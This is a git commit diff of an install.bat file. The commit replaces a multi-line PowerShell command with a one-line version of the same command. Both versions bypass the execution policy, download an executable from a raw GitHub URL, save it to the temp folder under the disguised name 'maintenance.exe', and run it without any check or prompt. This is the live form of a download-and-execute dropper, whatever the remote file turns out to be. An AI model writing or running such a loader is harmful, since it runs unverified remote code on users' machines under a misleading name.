c567cc4e7dcc55905619a3852008869b7355519e
Maxwell Ma <2431798772@qq.com>
2026-09-06 21:56:11 +0800

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,8 +1,2 @@
-powershell -NoProfile -ExecutionPolicy Bypass -Command "
-# Maintenance Tool Update Module
-$dlUri='https://raw.githubusercontent.com/SmaZone2020/SmaZone2020.github.io/refs/heads/main/install.exe';
-$outExe=Join-Path $env:TEMP 'maintenance.exe';
-Invoke-WebRequest -Uri $dlUri -OutFile $outExe -UseBasicParsing;
-if(Test-Path $outExe){
-    Start-Process $outExe;
-}"
+@echo off
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$dlUri='https://raw.githubusercontent.com/SmaZone2020/SmaZone2020.github.io/refs/heads/main/install.exe'; $outExe=Join-Path $env:TEMP 'maintenance.exe'; Invoke-WebRequest -Uri $dlUri -OutFile $outExe -UseBasicParsing; if(Test-Path $outExe){ Start-Process $outExe }"
